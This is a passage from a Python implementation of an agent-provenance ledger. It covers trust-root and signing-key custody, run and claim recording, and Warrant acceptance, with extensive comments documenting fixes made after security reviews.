    ensure_oaip_dir()
    if fcntl is None:
        yield
        return
    fh = open(LOCK, "a+")
    try:
        fcntl.flock(fh.fileno(), fcntl.LOCK_EX)
        yield
    finally:
        try:
            fcntl.flock(fh.fileno(), fcntl.LOCK_UN)
        finally:
            fh.close()


def mark_untrusted(reasons):
    """Withdraw the CURRENT projection's authority, without destroying it.

    THE DEFECT THIS CLOSES (2026-07-30, third adversarial round, C2-F1a). A
    rebuild that refuses leaves the previous projection in place — deliberately,
    because fail-closed must not mean destroy-first. But "in place" was also
    "still authoritative": after a projection had been built from a store the
    canonical layer no longer supports (or with a stub verifier), every honest
    rebuild afterwards refused (rc=1) and `oaip log` went on printing "(signed
    decision)" for the forged acceptance, indefinitely. A refusal that leaves a
    known-bad projection readable as truth has refused nothing.

    So the bytes stay — they are evidence, and a diagnosis may need them — and
    the AUTHORITY goes: `oaip log` and `oaip verify` refuse until a rebuild
    succeeds, and a successful rebuild removes this marker itself."""
    if not DB.exists():
        return
    try:
        UNTRUSTED.write_text(json.dumps(
            {"at": int(time.time()), "reasons": [str(r) for r in reasons]},
            sort_keys=True) + "\n")
    except OSError as e:                # cannot mark it: say so, never silently
        print(f"warning: cannot write {UNTRUSTED} ({e}); the projection at {DB} "
              "may assert facts this canonical layer does not support",
              file=sys.stderr)


def untrusted_reason():
    """Why the projection is not to be believed, or None."""
    if not UNTRUSTED.is_file():
        return None
    try:
        doc = loads_ijson(UNTRUSTED.read_bytes())
        reasons = doc.get("reasons") if isinstance(doc, dict) else None
        if isinstance(reasons, list) and reasons:
            return "; ".join(str(r) for r in reasons[:3])
    except (ValueError, OSError):
        pass
    return "a rebuild refused this canonical layer (reason unreadable)"


def require_trusted_projection():
    why = untrusted_reason()
    if why is None:
        return
    sys.exit(f"refusing to report the projection at {DB}: a rebuild REFUSED "
             f"this canonical layer, so what the projection asserts is no longer "
             f"known to be derivable from it — {why}. Fix the canonical layer and "
             f"run `oaip rebuild` (the marker is {UNTRUSTED}; the projection "
             "itself has been left untouched for inspection).")


# The projection's column names are the RECORD's field names (SPEC §5). They
# were not: `command`/`before_tree`/`after_tree`/`env_fp`/`check_cmd`/
# `check_exit`/`supported` were a second, unversioned vocabulary sitting next to
# §2's, and `tools/intoto.py` followed THEM against the specification, with a
# comment saying so. A projection whose columns contradict the records it
# projects is how that happens.
#
# `format` exists so nothing here can silently conflate a v0.1 record with a
# pre-0.1 one read through §6.4 legacy mode: a legacy execution's
# `input_state` holds a git TREE id, not a StateID, and a column that cannot
# say which is which invites exactly the misreading §6.4 forbids.
SCHEMA = """
CREATE TABLE IF NOT EXISTS intents(
  id TEXT PRIMARY KEY, actor TEXT, objective TEXT NOT NULL, parent_id TEXT,
  constraints TEXT, acceptance_refs TEXT, created_at INTEGER, format TEXT);
CREATE TABLE IF NOT EXISTS states(
  id TEXT PRIMARY KEY, repo_commit TEXT, worktree_tree TEXT,
  env_fingerprint TEXT, toolchain_fingerprint TEXT);
CREATE TABLE IF NOT EXISTS executions(
  id TEXT PRIMARY KEY, intent_id TEXT, actor TEXT, runtime TEXT,
  invocation TEXT NOT NULL, status TEXT, exit_code INTEGER, input_state TEXT,
  output_state TEXT, environment TEXT, output TEXT, created_at INTEGER,
  format TEXT);
CREATE TABLE IF NOT EXISTS effects(
  id TEXT PRIMARY KEY, execution_id TEXT, kind TEXT, target TEXT,
  before_blob TEXT, after_blob TEXT);
CREATE TABLE IF NOT EXISTS artifacts(
  hash TEXT PRIMARY KEY, kind TEXT, size INTEGER);
CREATE TABLE IF NOT EXISTS attributions(
  id TEXT PRIMARY KEY, effect_id TEXT, cause TEXT, method TEXT,
  confidence_ppm INTEGER);
CREATE TABLE IF NOT EXISTS claims(
  id TEXT PRIMARY KEY, execution_id TEXT, predicate TEXT, runtime TEXT,
  check_hash TEXT, verdict TEXT, transcript_hash TEXT, subject_hash TEXT,
  evidence TEXT, proposed_by TEXT, created_at INTEGER, format TEXT);
-- UNIQUE because this is the protocol's central edge and it had no constraint at
-- all: four concurrent rebuilds wrote four identical rows for one store record
-- and nothing downstream could tell that from four acceptances (F10, 2026-07-30).
-- One (claim, warrant) pair is one fact.
CREATE TABLE IF NOT EXISTS warrants(
  claim_id TEXT, warrant_id TEXT, created_at INTEGER,
  UNIQUE(claim_id, warrant_id));
"""


# ---------- commands ----------
def cmd_init(_):
    # A SYMLINKED ledger silently relocates the signing key out of the path every
    # exclusion here names, and `init` used to follow the symlink without a word
    # (F6). Refuse: the one moment OAIP owns this directory is when it creates it.
    if OAIP.is_symlink():
        sys.exit(f"refusing to init: {OAIP} is a symlink to "
                 f"{os.readlink(OAIP)!r}. The ledger holds this observer's "
                 "SIGNING KEY, and every protection here excludes it by the name "
                 f"{OAIP} — through a symlink the key lands in the snapshot (and "
                 "in .git/objects) under the target's name instead. Remove the "
                 f"symlink and let `oaip init` create a real {OAIP} directory.")
    ensure_oaip_dir()
    ensure_trust_root_dir()
    db(create=True).executescript(SCHEMA)
    wrun("--store", str(WSTORE), "init")
    if not WKEY.exists():
        # CREATE THE FILE BEFORE THE SECRET GOES INTO IT. `warrant keygen` writes
        # the seed and then chmods 0600, which leaves a window in which the key
        # exists at the umask's mode; on a host with umask 0022 that window is a
        # world-readable signing key. `O_EXCL` also refuses to follow a symlink
        # planted at that path, which is the same window used the other way.
        try:
            os.close(os.open(WKEY, os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o600))
        except OSError as e:
            sys.exit(f"cannot create the signing key {WKEY}: {e}")
        r = wrun("keygen", "--out", str(WKEY))
        # Record the PUBLIC half. OAIP is stdlib-only and cannot derive an Ed25519
        # public key from a seed, so the one moment the pubkey is knowable is the
        # line `warrant keygen` prints. Without it OAIP could not say which key it
        # custodies, and a keyring that cannot name its own key is not a keyring.
        m = re.search(r"\bpubkey\s+([0-9a-f]{64})\b", r.stdout or "")
        if m:
            PUBKEY.write_text(m.group(1) + "\n")
        elif WKEY.stat().st_size == 0:
            # No Warrant CLI generated anything: leave no empty file behind, or
            # the next `init` would take it for a key it already custodies.
            WKEY.unlink(missing_ok=True)
    ensure_trust()
    harden_trust_perms()
    require_trust_custody()
    # Stamp the store format ONCE, and never restamp: this marker is what tells
    # `rebuild` that every accept in this store had the chance to carry an
    # explicit claim link, so a missing one is a defect and not history (F8).
    if not STOREMETA.is_file():
        # The trust-root POINTER is written here too, and it is a hint for a
        # human and for a deployment whose root is not in the default place — it
        # is never authoritative, because this file is inside the workspace the
        # observed agent writes (see `store_trust_pointer`).
        STOREMETA.write_text(json.dumps(
            {"oaip_store": STORE_FORMAT, "note_convention_since": int(time.time()),
             "trust_root": {"mode": trust_root_mode(),
                            "path": str(TRUST_ROOT.resolve())}},
            sort_keys=True) + "\n")
    # Keep the signing key and the store out of the USER's own commits too.
    # workspace_snapshot() excludes .oaip by pathspec, but a plain `git add -A`
    # by the user would still commit dev.key; init owns the directory, so init
    # owns keeping it ignored. Idempotent: never duplicates the line, and a
    # bare `.oaip` already present is already an exclusion — appending `.oaip/`
    # next to it would be noise. A DIRECTORY named .gitignore is not writable
    # config: warn and move on rather than crash (IsADirectoryError, found in
    # the 2026-07-30 adversarial review).
    gitignore = Path(".gitignore")
    if gitignore.exists() and not gitignore.is_file():
        print(f"warning: {gitignore} is not a regular file; add '.oaip/' to "
              "your git excludes yourself", file=sys.stderr)
    else:
        lines = gitignore.read_text().splitlines() if gitignore.is_file() else []
        already = {".oaip", ".oaip/", "/.oaip", "/.oaip/"}
        if not any(l.strip() in already for l in lines):
            with gitignore.open("a") as f:
                if lines and not gitignore.read_text().endswith("\n"):
                    f.write("\n")
                f.write(".oaip/\n")
    if trust_root_mode() == "external":
        print(f"initialized {OAIP} (ledger + warrant store)\n"
              f"  trust root: {TRUST_ROOT.resolve()}\n"
              "  The signing key and the keyring live THERE, not in this "
              "workspace: what `oaip run` observes must not be able to rewrite "
              "who may accept its work. `oaip trust-root` explains what that "
              "does and does not stop.")
    else:
        print(f"initialized {OAIP} (ledger + warrant store + dev key)")
        warn_workspace_trust_root()


def cmd_trust_root(a):
    """Report — or move — the directory holding the key and the keyring.

    This command exists because the answer to "who can forge an acceptance here?"
    is now a property of the DEPLOYMENT, not of the code, and a property nobody
    can read off is one nobody checks."""
    if a.path:
        print(TRUST_ROOT.resolve())
        return
    if a.migrate:
        return migrate_trust_root(a)
    mode = trust_root_mode()
    print(f"trust root:  {TRUST_ROOT.resolve()}")
    print(f"  found by:  {TRUST_ROOT_SOURCE}")
    print(f"  position:  " + (
        "IN THE OBSERVED WORKSPACE — the observed command can read the signing "
        "key and rewrite the keyring" if mode == "workspace" else
        "outside the observed workspace"))
    for label, p, want in (("key      ", WKEY, 0o600), ("keyring  ", TRUST, 0o600),
                           ("directory", TRUST_ROOT, 0o700)):
        m = _perm(p)
        print(f"  {label}: {p}"
              + (" (absent)" if not os.path.exists(p) else "")
              + (f"  mode {m:04o}" + ("" if m is not None and not (
                  m & (KEY_MODE_FORBIDDEN if p == WKEY else WRITE_MODE_FORBIDDEN))
                  else "  <-- REFUSED") if m is not None else ""))
    actors, err = read_trust()
    print(f"  keyring  : {err}" if err else
          f"  vouches for: {sum(len(v) for v in actors.values())} key(s) across "
          f"{len(actors)} actor(s)")
    print("\nWhat relocation stops: a party whose write access is confined to "
          "the workspace — the observed agent under a container mount, a CI "
          "checkout, a sandboxed tool — cannot read this key or vouch for its "
          "own.\nWhat it does NOT stop: a process running as this uid, which can "
          "read the trust root wherever it is. That needs a separate uid or a "
          "separate signing process (SPEC §8.4, profiles C and D — documented, "
          "not implemented).")
    if mode == "workspace":
        print("\nThis ledger is in the arrangement relocation exists to prevent. "
              "`oaip trust-root --migrate` moves the key and the keyring out; "
              "acceptance edges filed before the move survive it.")


def migrate_trust_root(a):
    """Move an in-workspace trust root out, once, in one command.

    Fails closed in both directions: it refuses to move a root that is already
    outside the workspace (there is nothing to fix and moving a live keyring is
    not free), and it refuses to move ONTO an existing key (that would silently
    give this ledger a second custody, or destroy another ledger's)."""
    src = TRUST_ROOT
    if trust_root_mode() != "workspace":
        sys.exit(f"nothing to migrate: this ledger's trust root is {src.resolve()},"
                 " already outside the observed workspace. (`oaip trust-root` "
                 "reports where it is and what that stops.)")
    dst = Path(a.to) if a.to else default_trust_root()
    if in_workspace(dst):
        sys.exit(f"refusing to migrate into {dst}: it is inside the workspace "
                 "the observed command runs in, which is the arrangement this "
                 "command exists to leave.")
    moving = [p for p in (WKEY, PUBKEY, TRUST) if p.exists()]
    if not moving:
        sys.exit(f"nothing to migrate: no key and no keyring in {src}.")
    for p in moving:
        if (dst / p.name).exists():
            sys.exit(f"refusing to migrate: {dst / p.name} already exists. A "
                     "trust root is per-ledger; writing this ledger's key over "
                     "another's would leave two ledgers unable to say which key "
                     "is whose. Pick an empty directory with --to.")
    try:
        dst.mkdir(parents=True, exist_ok=True)
        if os.name == "posix":
            os.chmod(dst, 0o700)
        for p in moving:
            shutil.move(str(p), str(dst / p.name))
    except OSError as e:
        sys.exit(f"migration failed after moving {[p.name for p in moving]}: {e}. "
                 f"Check {src} and {dst} by hand before running anything else — "
                 "the key may be in either.")
    apply_trust_root(dst)
    harden_trust_perms()
    # Record the new location for a human and for a deployment that does not pin
    # it in the environment. Not authoritative (this file is agent-writable);
    # the default location is found without it.
    if STOREMETA.is_file():
        try:
            meta, why = loads_ijson(STOREMETA.read_bytes()), None
        except (ValueError, OSError) as e:
            meta, why = None, e
        if not isinstance(meta, dict):
            print(f"warning: {STOREMETA} is unreadable ({why or 'not an object'});"
                  " the key moved, but this ledger now records nothing about "
                  "where. Pass --trust-root, or fix the marker.", file=sys.stderr)
        else:
            meta["trust_root"] = {"mode": "external", "path": str(dst.resolve())}
            STOREMETA.write_text(json.dumps(meta, sort_keys=True) + "\n")
    print(f"moved {', '.join(p.name for p in moving)} from {src} to {dst}\n"
          "  The observed workspace no longer holds this ledger's signing key or "
          "its keyring.\n  Run `oaip rebuild` to confirm every acceptance edge "
          "still derives (it reads the keyring in its new place).")
    if not same_path(dst, default_trust_root()):
        print(f"  {dst} is not the default location for this workspace "
              f"({default_trust_root()}), so pass `--trust-root {dst}` — or set "
              f"{TRUST_ROOT_ENV} — where the recorded pointer is not enough.")


def store_record(rec, ts=None):
    """Canonicalize, VALIDATE, store. Returns the artifact hash.

    The writer runs the same validator every reader runs. Not belt-and-braces:
    for the whole life of this file the writer emitted records no reader of the
    SPECIFICATION could parse, and nothing in the repository was positioned to
    notice. A writer that does not check its own output against the schema is
    exactly the position this branch is here to leave."""
    outcome, t, _v, detail = validate_record(rec)
    if outcome != "valid":
        sys.exit(f"refusing to write a record this implementation's own reader "
                 f"would reject ({outcome}: {detail}). This is a bug in "
                 f"impl/oaip.py, not in your ledger.")
    return put_artifact(canon(rec), artifact_kind(t))


def cmd_intent(a):
    i = kid()
    con = db()
    ts = int(time.time())
    # SPEC §5 is a MUST: the canonical layer is content-addressed artifacts plus the
    # Warrant store, and the SQLite index is a PROJECTION that must be rebuildable
    # from it. Records used to exist only as rows -- so deleting the projection
    # destroyed the invocation, the exit code, the state snapshots, the environment
    # fingerprint and the intent link, none of which appeared anywhere
    # content-addressed. Demonstrated 2026-07-30 by deleting ledger.db. The
    # projection was the source of truth, which is the one thing §5 forbids, and
    # the opposite of the SPEC's own closing line.
    actor = getattr(a, "actor", None) or default_actor()
    constraints = list(getattr(a, "constraint", None) or [])
    refs = sorted(set(getattr(a, "acceptance_ref", None) or []))
    for h in refs:
        if not HEX64.match(h):
            sys.exit(f"--acceptance-ref {h!r} is not a hex64 artifact hash "
                     "(SPEC §2.3: acceptance_refs cite artifacts by address)")
    store_record({"intent": "0.1", "id": i, "actor": actor,
                  "parent": a.parent, "objective": a.description,
                  "constraints": constraints, "acceptance_refs": refs,
                  "ts": ts})
    con.execute("""INSERT INTO intents(id,actor,objective,parent_id,constraints,
                   acceptance_refs,created_at,format) VALUES (?,?,?,?,?,?,?,?)""",
                (i, actor, a.description, a.parent,
                 canon(constraints).decode(), canon(refs).decode(), ts, "0.1"))
    con.commit()
    print(i)
    return i


def _record_state(con, sid, state):
    con.execute("""INSERT OR REPLACE INTO states(id,repo_commit,worktree_tree,
                   env_fingerprint,toolchain_fingerprint) VALUES (?,?,?,?,?)""",
                (sid, state["repo_commit"], state["worktree_tree"],
                 state["env_fingerprint"], state["toolchain_fingerprint"]))


def cmd_run(a):
    if not a.command:
        sys.exit("nothing to run: give a command after `--`")
    db()                                # refuse early if there is no ledger
    before_id, before = snapshot_state()
    # WHY status/exit_code ARE COMPUTED AND NOT ASSUMED (SPEC §2.4). The old code
    # was `subprocess.run(a.command)` with the return code copied straight into
    # the record, so a command that did not exist raised FileNotFoundError and
    # replaced the observation with a traceback, and a command killed by a signal
    # was recorded as having "exited" with the negative number Python uses for
    # that. §2.4's three statuses exist precisely so neither is written down as
    # something it was not.
    try:
        proc = subprocess.run(a.command, capture_output=True, text=True)
    except OSError as e:
        status, code, out = "failed", None, f"{type(e).__name__}: {e}\n"
    else:
        out = proc.stdout + proc.stderr
        if 0 <= proc.returncode <= 255:
            status, code = "exited", proc.returncode
        else:
            status, code = "killed", None
    after_id, after = snapshot_state()
    stdout_hash = put_artifact(out.encode(), "stdout")
    eid = kid()
    ts = int(time.time())
    actor = getattr(a, "actor", None) or default_actor()
    store_record({
        "execution": "0.1", "id": eid, "intent_id": a.intent,
        "executor": {"actor": actor, "runtime": "exec@v1"},
        "input_state": before_id, "output_state": after_id,
        "invocation": list(a.command), "environment": before["env_fingerprint"],
        "status": status, "exit_code": code, "output": stdout_hash,
        "ts": ts})
    # Effect and Attribution are SEPARATE records (§2.5, §2.6), not members
    # nested inside the execution. They were nested, which made an Attribution
    # unciteable: §2.6 gives it an `effect_id`, and a causal claim that cannot be
    # addressed cannot be disputed, superseded or cited as support.
    #
    # EVERY artifact is written BEFORE the projection transaction opens.
    # `put_artifact` uses its own connection, so writing one from inside an open
    # write transaction deadlocks against this process's own lock — which it did,
    # the first time these records became separate artifacts.
    rows = []
    for e in effects_between(before["worktree_tree"], after["worktree_tree"]):
        fid, aid = kid(), kid()
        store_record({"effect": "0.1", "id": fid, "execution_id": eid,
                      "kind": e["kind"], "target": e["target"],
                      "before": e["before"], "after": e["after"],
                      "entities": []})
        # exclusive-window attribution: we wrapped the command -> high confidence,
        # capped BELOW certainty by §7.6 because we did not start every writer.
        store_record({"attribution": "0.1", "id": aid, "effect_id": fid,
                      "cause": eid, "method": "exclusive-command-window",
                      "confidence_ppm": 999000, "support": [stdout_hash]})
        rows.append((fid, aid, e))
    n = len(rows)
    con = db()
    _record_state(con, before_id, before)
    _record_state(con, after_id, after)
    con.execute("""INSERT INTO executions(id,intent_id,actor,runtime,invocation,
                   status,exit_code,input_state,output_state,environment,
                   output,created_at,format)
                   VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)""",
                (eid, a.intent, actor, "exec@v1", canon(list(a.command)).decode(),
                 status, code, before_id, after_id, before["env_fingerprint"],
                 stdout_hash, ts, "0.1"))
    for fid, aid, e in rows:
        con.execute("""INSERT INTO effects(id,execution_id,kind,target,
                       before_blob,after_blob) VALUES (?,?,?,?,?,?)""",
                    (fid, eid, e["kind"], e["target"], e["before"], e["after"]))
        con.execute("""INSERT INTO attributions(id,effect_id,cause,method,
                       confidence_ppm) VALUES (?,?,?,?,?)""",
                    (aid, fid, eid, "exclusive-command-window", 999000))
    con.commit()
    # Both identities are printed because they are two different things and the
    # ledger now holds both: `in`/`out` are §2.2 StateIDs (SHA-256 over the whole
    # State record, fingerprints included), `before_tree`/`after_tree` are the
    # git tree objects inside them. Printing only one taught a reader to treat a
    # tree id as a StateID, which is exactly the confusion §6.4 has to warn about
    # for legacy records.
    print(f"execution {eid}  status={status} exit={code}  effects={n}  "
          f"in={before_id[:10]} out={after_id[:10]}  "
          f"before_tree={before['worktree_tree'][:10]} "
          f"after_tree={after['worktree_tree'][:10]}")
    return eid


def cmd_claim(a):
    con = db()
    ex = con.execute("SELECT output FROM executions WHERE id=?",
                     (a.execution,)).fetchone()
    if not ex:
        sys.exit(f"no execution {a.execution}")
    # The check is EVIDENCE, so it is stored and cited by hash (§2.7). It used to
    # be echoed into the record as text, which describes a check without being
    # one: a reader could not fetch the bytes that ran and re-run them.
    check_hash = put_artifact(a.check.encode(), "check")
    # validation check — SEPARATE from execution success (exit_code=0 earns
    # nothing). It runs THROUGH THE HOST SHELL, as this process's user, in the
    # observed workspace, with no isolation of the filesystem, the network or
    # the environment — which is why the record says `oaip-host-shell@v1` and
    # not `cmd@v1` (§7.3). Nothing here confines the check; the tag stops the
    # record from claiming otherwise.
    #
    # OBSERVE THE CHECK'S OWN WINDOW (§2.7). The Execution's output state was
    # snapshotted when `oaip run` returned — before this command existed — so
    # anything the check writes lands AFTER the last observation. Measured on
    # the unfixed tree: a check of `touch check-escaped-container` created that
    # file in the observed workspace and the signed decision still recorded
    # `effects=0` (external audit by Codex, 2026-07-31, reproduced locally).
    #
    # The window is taken here rather than from the Execution's after-state on
    # purpose: between `oaip run` and `oaip claim` a human may have edited the
    # workspace, and attributing THAT to the check would be a second false
    # attribution answering the first.
    before_check = workspace_snapshot()
    chk = subprocess.run(a.check, shell=True, capture_output=True, text=True)
    after_check = workspace_snapshot()
    check_effects = sorted(effects_between(before_check, after_check),
                           key=lambda e: (e["target"], e["kind"]))
    check_effects_hash = None
    if check_effects:
        # Stored whichever way this ends, so the observation survives the
        # refusal: a refusal that leaves no evidence of what it saw teaches the
        # operator to re-run with the flag and nothing else.
        #
        # DELIBERATELY NOT SHAPED LIKE A RECORD. §1.1 classifies any object with
        # a `<tagname>: "<version>"` member as a record type, and §6.2 fails
        # closed when a record CITES an artifact this reader cannot read — so a
        # `{"check_effects": "0.1", ...}` artifact would classify as
        # `unknown-type` and every claim citing it would refuse to rebuild. No
        # member here can ever hold a version-shaped string (§7.4).
        doc = {"check_effects": check_effects, "before_tree": before_check,
               "after_tree": after_check}
        check_effects_hash = put_artifact(canon(doc), "check-effects")
        changed = ", ".join(f"{e['kind']} {e['target']}"
                            for e in check_effects[:10])
        if not getattr(a, "allow_check_effects", False):
            sys.exit(
                "refusing to file this claim: the validation check MUTATED the "
                f"observed workspace ({len(check_effects)}): {changed}"
                + (", …" if len(check_effects) > 10 else "")
                + f"\n  observed effects recorded as artifact "
                  f"{check_effects_hash[:12]}; no claim was written.\n"
                  "  The Execution's output state was snapshotted before this "
                  "check ran, so filing the claim would have produced a signed "
                  "decision whose effect list omits every change above (SPEC "
                  "§2.7).\n"
                  "  Either make the check read-only, or re-run with "
                  "`--allow-check-effects` to file a claim that CITES these "
                  "effects as evidence. The mutation itself already happened: "
                  "this observes, it does not confine (SPEC §8.5 SA-13).")
    transcript_hash = put_artifact((chk.stdout + chk.stderr).encode(),
                                   "check-transcript")
    verdict = "pass" if chk.returncode == 0 else "fail"
    # content-addressed claim subject (what the decision is ABOUT), §2.8. Sorted
    # by (target, kind) because array order is significant in JCS and this
    # array's hash is the address §3 files the decision under.
    effects = sorted(
        ((r[0], r[1], r[2]) for r in
         con.execute("SELECT target,kind,after_blob FROM effects "
                     "WHERE execution_id=?", (a.execution,))),
        key=lambda r: (r[0], r[1]))
    subject = {"claim_subject": "0.1", "predicate": a.predicate,
               "execution_id": a.execution,
               "effects": [{"target": t, "kind": k, "after": af}
                           for t, k, af in effects]}
    outcome, _t, _v, detail = validate_record(subject)
    if outcome != "valid":
        sys.exit(f"refusing to write a claim subject this reader would reject "
                 f"({detail})")
    subject_hash = put_artifact(canon(subject),
                                artifact_kind("claim_subject"))  # JCS, §1
    cid = kid()
    # The check's own effects ride in `evidence` (§2.7): the array is open, so
    # this needs no format change, and it means no record of a mutating check
    # can be read as though nothing changed. `sorted` over a set is the §2.7
    # rule (ascending, no duplicates), not tidiness.
    evidence = sorted({h for h in (ex[0], check_effects_hash)
                       if isinstance(h, str)})
    ts = int(time.time())
    proposed_by = getattr(a, "actor", None) or default_actor()
    store_record({"claim": "0.1", "id": cid, "subject": subject_hash,
                  "predicate": a.predicate, "evidence": evidence,
                  "validation": {"runtime": HOST_SHELL_RUNTIME,
                                 "check": check_hash,
                                 "verdict": verdict,
                                 "transcript": transcript_hash},
                  "proposed_by": proposed_by, "ts": ts})
    con.execute("""INSERT INTO claims(id,execution_id,predicate,runtime,check_hash,
                   verdict,transcript_hash,subject_hash,evidence,proposed_by,
                   created_at,format) VALUES (?,?,?,?,?,?,?,?,?,?,?,?)""",
                (cid, a.execution, a.predicate, HOST_SHELL_RUNTIME, check_hash, verdict,
                 transcript_hash, subject_hash, canon(evidence).decode(),
                 proposed_by, ts, "0.1"))
    con.commit()
    print(f"claim {cid}  predicate={a.predicate}  check_exit={chk.returncode}  "
          f"verdict={verdict}  "
          f"{'SUPPORTED' if verdict == 'pass' else 'UNSUPPORTED (check failed)'}")
    return cid, verdict == "pass"


def cmd_accept(a):
    """THE BRIDGE: an accepted claim becomes a signed Warrant record.

    Serialised against `rebuild` (F10): a concurrent accept and rebuild used to
    raise an uncaught sqlite3.OperationalError and lose this insert."""
    with store_lock():
        return _accept(a)


def _accept(a):
    # Before the key is used at all: a signature made with a key other accounts
    # can read is not evidence that THIS actor decided anything (O4).
    require_trust_custody()
    warn_workspace_trust_root()
    con = db()
    c = con.execute("""SELECT predicate,runtime,check_hash,verdict,transcript_hash,
                       subject_hash,evidence FROM claims WHERE id=?""",
                    (a.claim,)).fetchone()
    if not c:
        sys.exit(f"no claim {a.claim}")
    (predicate, runtime, check_hash, verdict, transcript_hash, subject_hash,
     evidence_json) = c
    if verdict != "pass":
        sys.exit("refusing to accept: the claim's validation check did NOT pass "
                 "(execution success is not acceptance)")
    # materialize the subject + policy + check blob + transcript as warrant blobs
    w = lambda *args: wrun("--store", str(WSTORE), *args)
    subject_bytes = (ART / subject_hash).read_bytes()
    subj_file = OAIP / "subject.tmp"
    subj_file.write_bytes(subject_bytes)
    subj = w("blob", "add", str(subj_file)).stdout.strip()
    policy = OAIP / "policy.txt"
    if not policy.exists():
        policy.write_text("OAIP decision policy v0: accept requires a passing validation check.\n")
    pol = w("blob", "add", str(policy)).stdout.strip()
    # The check blob is materialized from the ARTIFACT, byte for byte, rather
    # than re-rendered from a command string in a table: the whole reason §2.7
    # cites it by hash is that the bytes a reader fetches from the Warrant store
    # and the bytes the claim's `validation.check` names must be the same bytes.
    checkfile = OAIP / "check.tmp"
    checkfile.write_bytes((ART / check_hash).read_bytes())
    transcript_file = OAIP / "transcript.tmp"
    transcript_file.write_bytes((ART / transcript_hash).read_bytes())
    # §3: `evidence` = the claim's evidence artifact hashes. They were never
    # passed, so the bridge filed a decision citing none of the provenance it
    # exists to cite. Blob-added from the artifact files so they RESOLVE in the
    # store rather than dangling as unresolved references.
    ev_args = []
    try:
        for h in json.loads(evidence_json or "[]"):
            p = ART / h
            if p.is_file():
                ev_args += ["--evidence", str(p)]
    except ValueError:
        pass
    # HOW THE VALIDATION ENTERS THE WARRANT, AND WHY NOT AS A CHECK REASON.
    # It used to go in as `{kind:"check", runtime:"cmd@v1", …}`, passed through
    # from the claim unchanged. Warrant SPEC §3 defines `cmd@v1` as "the check
    # blob is executed as a command in an isolated container"; OAIP executes it
    # with `subprocess.run(check, shell=True)` on the observer's own host. The
    # signed record therefore named an execution profile that never happened —
    # a provenance defect, not an injection one (external audit by Codex,
    # 2026-07-31, reproduced locally).
    #
    # The honest tag (`oaip-host-shell@v1`, §7.3) CANNOT be substituted here:
    # Warrant's registry (Warrant SPEC §13.1) admits `cmd@v1` and `ski@v1` only,
    # an unregistered runtime makes the Warrant record invalid by MUST, and
    # `warrant accept --runtime` is a closed choice list. Registering an
    # OAIP-namespaced runtime there is a pull request against Warrant, i.e.
    # cross-repository coordination this implementation must not presume.
    #
    # So until that registration exists (or OAIP grows a runtime that really
    # satisfies a Warrant tag), the validation is filed as PROSE naming the
    # runtime and the verdict, with the check blob and the transcript carried as
    # EVIDENCE so the bytes still resolve in the store and are still citable by
    # hash. What is lost is stated rather than hidden: the warrant no longer
    # carries a machine-readable `because[].check`, so it contributes no §7(b)
    # outcome fingerprint and a tool looking for a check reason will find none.
    # That is a smaller loss than a signed claim of containment that did not
    # happen.
    if runtime in WARRANT_CHECK_RUNTIMES:
        check_args = ["--check", str(checkfile), "--verdict", "pass",
                      "--runtime", runtime, "--transcript",
                      str(transcript_file)]
        validation_prose = []
    else:
        check_args = []
        where = (" — the check ran through the host shell in the observed "
                 "workspace, NOT in an isolated container"
                 if runtime == HOST_SHELL_RUNTIME else
                 " — OAIP did not itself establish this runtime's execution "
                 "profile")
        validation_prose = ["--reason", (
            f"validation: runtime={runtime} verdict={verdict}{where}, so it is "
            f"not filed as a Warrant check reason (Warrant SPEC §3/§13.1). The "
            f"check blob {check_hash} and its transcript {transcript_hash} are "
            f"cited as evidence.")]
        ev_args += ["--evidence", str(checkfile),
                    "--evidence", str(transcript_file)]
    # The subject blob is the claim's SUBJECT, and two claims can share one:
    # {predicate, execution, effects} excludes the check command and verdict, so
    # `--check true` and `--check false` over the same execution collide. A
    # rebuild that re-derived the acceptance edge by subject hash alone projected
    # this one signed warrant onto the FAILED claim too (2026-07-30 adversarial
    # review; §5 violation). So the linkage is made EXPLICIT at accept time: the
    # accepted claim's id rides in subject.note, INSIDE the signed body — rebuild
    # follows it instead of guessing by subject hash. Legacy records without the
    # note fall back to subject-hash matching restricted to supported claims.
    r = w("accept", "--subject", subj, "--under", pol,
          *check_args,
          "--reason", f"claim: {predicate}",
          *validation_prose,
          "--note", f"oaip-claim:{a.claim}",
          *ev_args,
          "--actor", a.actor, "--key", str(WKEY))
    wid = r.stdout.strip()
    for f in (subj_file, checkfile, transcript_file):
        f.unlink(missing_ok=True)
    if len(wid) != 64:
        sys.exit(f"warrant filing failed: {r.stdout} {r.stderr}")
    # created_at is the warrant's OWN signed ts, read back from the store — not a
    # second reading of the clock. The projection row must be re-derivable from
    # the canonical layer alone (§5), and two clock reads can straddle a second
    # boundary: a rebuild that disagrees by one second is not "the same graph".
    env = json.loads((WSTORE / "records" / f"{wid}.json").read_text())
    wts = env["body"]["ts"]
    # BIND THE SIGNER TO THE ACTOR, in OAIP's own keyring, from the record that
    # was just filed. This is the fact `rebuild` will require before it derives an
    # acceptance edge (2026-07-30 review, F7/F3): without it, any self-generated
    # key claiming any actor id produced an edge, because Warrant reports an
    # unbound binding as a WARN by specification and exits 0.
    #
    # The key is read back out of the filed signature rather than assumed, so the
    # binding records what actually signed; when `init` captured the public half
    # it is cross-checked, and a mismatch is fatal — it would mean the store was
    # signed by a key this ledger does not custody.
    signed = next((s for s in env.get("sigs", [])
                   if isinstance(s, dict) and s.get("actor") == a.actor), None)
    signed_key = signed.get("key") if isinstance(signed, dict) else None
    if not (isinstance(signed_key, str) and HEX64.match(signed_key)):
        sys.exit(f"filed warrant {wid[:12]} carries no signature by {a.actor}; "
                 "refusing to record an acceptance nothing signed")
    if PUBKEY.is_file() and PUBKEY.read_text().strip() != signed_key:
        sys.exit(f"filed warrant {wid[:12]} was signed by {signed_key[:12]}, "
                 f"not by this ledger's own key ({PUBKEY.read_text().strip()[:12]})")
    # AND THE SIGNATURE IS VERIFIED HERE TOO, by OAIP, before anything is
    # recorded. `rebuild` and `verify` do it (C2-F1a) — but until they run, the
    # LIVE projection would assert an acceptance whose only evidence was that the
    # program named by $WARRANT_CLI said it had signed one. OAIP asks that
    # program to sign, so it cannot avoid delegating the SIGNING; it can decline
    # to take the result on trust.
    if not signature_verifies(wid, signed):
        # The one cause worth naming: the Warrant CLI that just signed this
        # record is older than SPEC v0.4 and signed the bare WarrantID. That is
        # a PINNING fault, not a forgery, and "whatever produced it is not
        # signing with the key it claims" is actively misleading about it — the
